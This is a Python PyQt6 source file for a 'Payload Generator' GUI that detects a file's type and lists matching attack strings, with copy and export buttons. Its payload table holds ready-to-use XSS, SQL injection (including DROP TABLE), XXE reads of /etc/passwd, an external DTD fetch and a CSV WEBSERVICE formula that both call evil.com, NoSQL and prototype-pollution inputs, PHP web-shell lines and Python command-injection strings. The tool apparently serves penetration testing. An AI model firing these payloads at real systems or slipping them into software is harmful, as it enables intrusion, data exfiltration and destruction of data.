"""
Payload Generator GUI - Heuristic payload generation based on file types
"""

import json
import logging
import os
import mimetypes
from pathlib import Path
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QTextEdit,
    QTableWidget, QTableWidgetItem, QGroupBox, QFormLayout,
    QFileDialog, QMessageBox, QProgressBar, QComboBox, QSpinBox
)
from PyQt6.QtCore import Qt, pyqtSignal, QThread
from PyQt6.QtGui import QFont, QColor

logger = logging.getLogger("PayloadGeneratorGUI")


class PayloadGenerator:
    """Generate heuristic payloads based on file types"""
    
    # File type detection patterns
    FILE_TYPE_PATTERNS = {
        'javascript': {
            'extensions': ['.js', '.jsx', '.ts', '.tsx'],
            'signatures': [b'function', b'const ', b'var ', b'class '],
            'payloads': [
                "'; alert('XSS'); //",
                "\"; alert('XSS'); //",
                "<script>alert('XSS')</script>",
                "${7*7}",
                "#{7*7}",
                "<img src=x onerror='alert(1)'>",
                "javascript:alert('XSS')",
            ]
        },
        'sql': {
            'extensions': ['.sql'],
            'signatures': [b'SELECT', b'INSERT', b'UPDATE', b'DELETE', b'WHERE'],
            'payloads': [
                "' OR '1'='1' --",
                "admin'--",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; WAITFOR DELAY '00:00:05' --",
            ]
        },
        'xml': {
            'extensions': ['.xml', '.svg', '.xsl'],
            'signatures': [b'<?xml', b'<root>', b'</'],
            'payloads': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
                "<!DOCTYPE test SYSTEM 'http://evil.com/test.dtd'>",
                "<svg/onload=alert('XSS')>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            ]
        },
        'json': {
            'extensions': ['.json'],
            'signatures': [b'{', b'[', b'"'],
            'payloads': [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"password": true}',
                '{"id": {"$gt": ""}}',
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            ]
        },
        'html': {
            'extensions': ['.html', '.htm'],
            'signatures': [b'<!DOCTYPE', b'<html', b'<head'],
            'payloads': [
                "<img src=x onerror='alert(1)'>",
                "<svg onload='alert(1)'>",
                "<script>alert('XSS')</script>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload='alert(1)'>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            ]
        },
        'php': {
            'extensions': ['.php', '.php5', '.phtml'],
            'signatures': [b'<?php', b'<?', b'echo', b'$_'],
            'payloads': [
                "'; system('id'); //",
                "'); system('id'); //",
                "\"; eval($_POST['cmd']); //",
                "<?php system($_GET['cmd']); ?>",
                "'; phpinfo(); //",
            ]
        },
        'python': {
            'extensions': ['.py'],
            'signatures': [b'import', b'def ', b'class ', b'print('],
            'payloads': [
                "__import__('os').system('id')",
                "eval(input())",
                "exec(input())",
                "__import__('subprocess').call(['sh','-c','id'])",
                "pickle.loads(user_input)",
            ]
        },
        'csv': {
            'extensions': ['.csv'],
            'signatures': [b',', b'\\n'],
            'payloads': [
                "=1+1",
                "=cmd|'/c whoami'!A0",
                "@SUM(1+9)*cmd|'/c calc'!A1",
                "-2+5+cmd|'/c powershell'!A1",
                "=WEBSERVICE('http://evil.com/'&A1)",
            ]
        },
        'pdf': {
            'extensions': ['.pdf'],
            'signatures': [b'%PDF'],
            'payloads': [
                "JavaScript embedded in PDF",
                "XFA form with malicious script",
                "Launch action payload",
            ]
        },
        'image': {
            'extensions': ['.jpg', '.jpeg', '.png', '.gif', '.bmp'],
            'signatures': [b'\\xFF\\xD8', b'\\x89PNG', b'GIF8'],
            'payloads': [
                "EXIF metadata injection",
                "Polyglot image/HTML",
                "Embedded malware",
            ]
        },
        'office': {
            'extensions': ['.docx', '.xlsx', '.pptx', '.doc', '.xls', '.ppt'],
            'signatures': [b'PK\\x03\\x04', b'D0CF11E0'],
            'payloads': [
                "VBA macro payload",
                "External data source injection",
                "OLE embedded object",
            ]
        },
        'archive': {
            'extensions': ['.zip', '.tar', '.gz', '.rar', '.7z'],
            'signatures': [b'PK\\x03\\x04', b'\\x1f\\x8b'],
            'payloads': [
                "Path traversal: ../../../etc/passwd",
                "Zip bomb/decompression bomb",
                "Symlink attack in archive",
            ]
        },
        'binary': {
            'extensions': ['.exe', '.dll', '.so', '.o'],
            'signatures': [b'MZ', b'\\x7fELF', b'\\xfe\\xed\\xfa'],
            'payloads': [
                "Buffer overflow payload",
                "ROP gadget chain",
                "Shellcode injection",
            ]
        },
    }
    
    @classmethod
    def detect_file_type(cls, file_path: str) -> str:
        """Detect file type by extension and signature"""
        path = Path(file_path)
        ext = path.suffix.lower()
        
        # Try to read file signature
        try:
            with open(file_path, 'rb') as f:
                signature = f.read(512)
        except:
            signature = b''
        
        # Check by extension and signature
        for ftype, patterns in cls.FILE_TYPE_PATTERNS.items():
            if ext in patterns['extensions']:
                # Verify with signature if available
                if patterns['signatures']:
                    for sig in patterns['signatures']:
                        if sig in signature:
                            return ftype
                return ftype
        
        # Fallback to mimetype
        mime, _ = mimetypes.guess_type(file_path)
        if mime:
            if 'image' in mime:
                return 'image'
            elif 'video' in mime:
                return 'image'  # treat similar to image
            elif 'application/pdf' in mime:
                return 'pdf'
        
        return 'unknown'
    
    @classmethod
    def get_payloads(cls, file_type: str) -> list:
        """Get payloads for file type"""
        if file_type in cls.FILE_TYPE_PATTERNS:
            return cls.FILE_TYPE_PATTERNS[file_type]['payloads']
        return []
    
    @classmethod
    def generate_payloads(cls, file_path: str) -> dict:
        """Generate payloads for a file"""
        file_type = cls.detect_file_type(file_path)
        payloads = cls.get_payloads(file_type)
        
        # Get file info
        try:
            file_size = os.path.getsize(file_path)
        except:
            file_size = 0
        
        return {
            'file_path': file_path,
            'file_name': Path(file_path).name,
            'file_type': file_type,
            'file_size': file_size,
            'detected_type': file_type,
            'payloads': payloads,
            'count': len(payloads),
            'categories': list(cls.FILE_TYPE_PATTERNS.keys()) if file_type == 'unknown' else [file_type]
        }


class PayloadGeneratorWorker(QThread):
    """Background worker for payload generation"""
    finished = pyqtSignal(dict)
    error = pyqtSignal(str)
    progress = pyqtSignal(str)
    
    def __init__(self, file_path: str):
        super().__init__()
        self.file_path = file_path
    
    def run(self):
        try:
            self.progress.emit(f"Analyzing {Path(self.file_path).name}...")
            result = PayloadGenerator.generate_payloads(self.file_path)
            self.finished.emit(result)
        except Exception as e:
            self.error.emit(str(e))


class PayloadGeneratorTab(QWidget):
    """GUI tab for payload generation"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.current_file = None
        self.payloads = []
        self.worker = None
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        
        # ===== FILE SELECTION SECTION =====
        file_group = QGroupBox("File Selection")
        file_layout = QHBoxLayout()
        
        self.file_label = QLabel("No file selected")
        self.file_label.setFont(QFont("Courier", 10))
        self.file_label.setStyleSheet("color: #ff6b6b;")
        file_layout.addWidget(QLabel("File:"))
        file_layout.addWidget(self.file_label)
        
        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self._select_file)
        file_layout.addWidget(browse_btn)
        file_layout.addStretch()
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # ===== FILE ANALYSIS SECTION =====
        analysis_group = QGroupBox("File Analysis")
        analysis_layout = QFormLayout()
        
        self.file_type_label = QLabel("Unknown")
        self.file_type_label.setStyleSheet("color: #51cf66; font-weight: bold;")
        analysis_layout.addRow("Detected Type:", self.file_type_label)
        
        self.file_size_label = QLabel("0 bytes")
        analysis_layout.addRow("File Size:", self.file_size_label)
        
        self.payload_count_label = QLabel("0")
        self.payload_count_label.setStyleSheet("color: #4dabf7; font-weight: bold;")
        analysis_layout.addRow("Payloads Available:", self.payload_count_label)
        
        analysis_group.setLayout(analysis_layout)
        layout.addWidget(analysis_group)
        
        # ===== PAYLOAD CUSTOMIZATION =====
        custom_group = QGroupBox("Payload Customization")
        custom_layout = QFormLayout()
        
        self.file_type_combo = QComboBox()
        self.file_type_combo.addItems(list(PayloadGenerator.FILE_TYPE_PATTERNS.keys()))
        self.file_type_combo.currentTextChanged.connect(self._on_type_changed)
        custom_layout.addRow("Override Type:", self.file_type_combo)
        
        generate_btn = QPushButton("Generate Payloads")
        generate_btn.clicked.connect(self._generate_payloads)
        custom_layout.addRow("", generate_btn)
        
        custom_group.setLayout(custom_layout)
        layout.addWidget(custom_group)
        
        # ===== PROGRESS INDICATOR =====
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        layout.addWidget(self.progress)
        
        # ===== PAYLOADS TABLE =====
        payload_label = QLabel("Generated Payloads:")
        payload_label.setFont(QFont("Arial", 11, QFont.Weight.Bold))
        layout.addWidget(payload_label)
        
        self.payloads_table = QTableWidget()
        self.payloads_table.setColumnCount(2)
        self.payloads_table.setHorizontalHeaderLabels(["#", "Payload"])
        self.payloads_table.horizontalHeader().setStretchLastSection(True)
        self.payloads_table.setMaximumHeight(300)
        layout.addWidget(self.payloads_table)
        
        # ===== PAYLOAD DETAILS =====
        details_group = QGroupBox("Payload Details")
        details_layout = QVBoxLayout()
        
        self.details_text = QTextEdit()
        self.details_text.setReadOnly(True)
        self.details_text.setMaximumHeight(200)
        self.details_text.setStyleSheet(
            "QTextEdit { background-color: #1e1e1e; color: #00ff00; font-family: Courier; }"
        )
        details_layout.addWidget(self.details_text)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        # ===== ACTION BUTTONS =====
        action_layout = QHBoxLayout()
        
        copy_btn = QPushButton("Copy Selected Payload")
        copy_btn.clicked.connect(self._copy_payload)
        action_layout.addWidget(copy_btn)
        
        export_btn = QPushButton("Export All Payloads")
        export_btn.clicked.connect(self._export_payloads)
        action_layout.addWidget(export_btn)
        
        clear_btn = QPushButton("Clear")
        clear_btn.clicked.connect(self._clear)
        action_layout.addWidget(clear_btn)
        
        action_layout.addStretch()
        layout.addLayout(action_layout)
        
        layout.addStretch()
        self.setLayout(layout)
        
        self.payloads_table.itemSelectionChanged.connect(self._on_payload_selected)
    
    def _select_file(self):
        """Select file to analyze"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select File for Analysis",
            "",
            "All Files (*.*)"
        )
        
        if file_path:
            self.current_file = file_path
            self.file_label.setText(file_path)
            self.file_label.setStyleSheet("color: #51cf66;")
            
            # Auto-analyze
            self._generate_payloads()
    
    def _on_type_changed(self, file_type: str):
        """Handle file type override"""
        if self.current_file:
            payloads = PayloadGenerator.get_payloads(file_type)
            self._display_payloads(file_type, payloads)
    
    def _generate_payloads(self):
        """Generate payloads for selected file"""
        if not self.current_file:
            QMessageBox.warning(self, "Error", "Please select a file first")
            return
        
        self.progress.setVisible(True)
        self.progress.setRange(0, 0)  # Indeterminate
        
        self.worker = PayloadGeneratorWorker(self.current_file)
        self.worker.finished.connect(self._on_generation_complete)
        self.worker.error.connect(self._on_generation_error)
        self.worker.progress.connect(lambda msg: self.progress.setFormat(msg))
        self.worker.start()
    
    def _on_generation_complete(self, result: dict):
        """Handle generation completion"""
        self.progress.setVisible(False)
        
        # Update file info
        self.file_type_label.setText(result['detected_type'])
        self.file_size_label.setText(f"{result['file_size']:,} bytes")
        self.payload_count_label.setText(str(result['count']))
        
        # Update combo box
        self.file_type_combo.blockSignals(True)
        self.file_type_combo.setCurrentText(result['detected_type'])
        self.file_type_combo.blockSignals(False)
        
        # Display payloads
        self.payloads = result['payloads']
        self._display_payloads(result['detected_type'], result['payloads'])
        
        logger.info(f"Generated {result['count']} payloads for {result['file_name']}")
    
    def _on_generation_error(self, error: str):
        """Handle generation error"""
        self.progress.setVisible(False)
        QMessageBox.critical(self, "Error", f"Failed to generate payloads:\n{error}")
        logger.error(f"Payload generation error: {error}")
    
    def _display_payloads(self, file_type: str, payloads: list):
        """Display payloads in table"""
        self.payloads_table.setRowCount(0)
        
        for idx, payload in enumerate(payloads):
            self.payloads_table.insertRow(idx)
            self.payloads_table.setItem(idx, 0, QTableWidgetItem(str(idx + 1)))
            self.payloads_table.setItem(idx, 1, QTableWidgetItem(str(payload)))
        
        # Update details
        details = f"File Type: {file_type}\n"
        details += f"Total Payloads: {len(payloads)}\n"
        details += f"Category: {file_type.upper()}\n\n"
        details += "Payload Types:\n"
        for idx, payload in enumerate(payloads[:3], 1):
            details += f"{idx}. {payload[:80]}\n"
        if len(payloads) > 3:
            details += f"... and {len(payloads) - 3} more"
        
        self.details_text.setText(details)
    
    def _on_payload_selected(self):
        """Handle payload selection"""
        selected_rows = self.payloads_table.selectionModel().selectedRows()
        if selected_rows:
            row = selected_rows[0].row()
            payload = self.payloads_table.item(row, 1).text()
            
            details = f"Selected Payload ({row + 1}):\n\n"
            details += payload
            details += f"\n\nLength: {len(payload)} characters"
            
            self.details_text.setText(details)
    
    def _copy_payload(self):
        """Copy selected payload to clipboard"""
        selected_rows = self.payloads_table.selectionModel().selectedRows()
        if not selected_rows:
            QMessageBox.warning(self, "Error", "Please select a payload")
            return
        
        row = selected_rows[0].row()
        payload = self.payloads_table.item(row, 1).text()
        
        from PyQt6.QtGui import QApplication
        QApplication.clipboard().setText(payload)
        QMessageBox.information(self, "Success", "Payload copied to clipboard")
    
    def _export_payloads(self):
        """Export all payloads to file"""
        if not self.payloads:
            QMessageBox.warning(self, "Error", "No payloads to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Payloads",
            f"{Path(self.current_file).stem}_payloads.txt",
            "Text Files (*.txt);;JSON Files (*.json)"
        )
        
        if not file_path:
            return
        
        try:
            if file_path.endswith('.json'):
                data = {
                    'file': self.current_file,
                    'file_type': self.file_type_label.text(),
                    'payloads': self.payloads
                }
                with open(file_path, 'w') as f:
                    json.dump(data, f, indent=2)
            else:
                with open(file_path, 'w') as f:
                    f.write(f"Payloads for: {self.current_file}\n")
                    f.write(f"Type: {self.file_type_label.text()}\n")
                    f.write("=" * 80 + "\n\n")
                    for idx, payload in enumerate(self.payloads, 1):
                        f.write(f"{idx}. {payload}\n\n")
            
            QMessageBox.information(self, "Success", f"Exported to {file_path}")
            logger.info(f"Exported {len(self.payloads)} payloads to {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to export:\n{e}")
    
    def _clear(self):
        """Clear all"""
        self.current_file = None
        self.payloads = []
        self.file_label.setText("No file selected")
        self.file_label.setStyleSheet("color: #ff6b6b;")
        self.file_type_label.setText("Unknown")
        self.file_size_label.setText("0 bytes")
        self.payload_count_label.setText("0")
        self.payloads_table.setRowCount(0)
        self.details_text.clear()


def main():
    """Module initialization"""
    logger.info("Payload Generator GUI module loaded successfully")
    return {
        "status": "ready",
        "module": "payload_generator_gui",
        "version": "1.0",
        "description": "Heuristic payload generator based on file types"
    }


if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2))
